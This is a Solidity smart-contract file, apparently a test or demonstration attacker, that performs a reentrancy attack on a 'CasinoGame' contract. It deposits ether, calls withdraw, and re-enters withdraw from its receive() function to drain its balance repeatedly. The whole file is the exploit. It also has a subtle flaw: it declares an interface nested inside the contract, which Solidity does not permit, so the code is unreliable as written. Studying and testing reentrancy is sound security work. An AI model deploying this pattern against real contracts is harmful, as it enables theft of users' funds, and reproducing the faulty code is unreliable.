// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/**
 * @title ReentrancyAttacker
 * @dev A contract that attempts to perform a reentrancy attack on the CasinoGame contract
 */
contract ReentrancyAttacker {
    // Interface for the CasinoGame contract
    interface ICasinoGame {
        function deposit() external payable;
        function withdraw(uint256 amount) external;
        function balanceOf(address player) external view returns (uint256);
    }
    
    // Reference to the CasinoGame contract
    ICasinoGame public casinoGame;
    
    // Flag to track if we're in the middle of an attack
    bool private attacking = false;
    
    /**
     * @dev Constructor
     * @param _casinoGame Address of the CasinoGame contract to attack
     */
    constructor(address _casinoGame) {
        casinoGame = ICasinoGame(_casinoGame);
    }
    
    /**
     * @dev Deposit funds into the CasinoGame contract
     */
    function deposit() external payable {
        casinoGame.deposit{value: msg.value}();
    }
    
    /**
     * @dev Attempt a reentrancy attack
     */
    function attack() external {
        attacking = true;
        
        // Get our current balance in the casino
        uint256 balance = casinoGame.balanceOf(address(this));
        require(balance > 0, "No balance to withdraw");
        
        // Withdraw our balance, which should trigger the receive function
        casinoGame.withdraw(balance);
        
        attacking = false;
    }
    
    /**
     * @dev Receive function that gets triggered when ETH is sent to this contract
     * This is where the reentrancy attack happens
     */
    receive() external payable {
        if (attacking) {
            // Check if we still have balance in the casino
            uint256 remainingBalance = casinoGame.balanceOf(address(this));
            
            // If we have balance and we're attacking, try to withdraw again
            if (remainingBalance > 0) {
                casinoGame.withdraw(remainingBalance);
            }
        }
    }
} 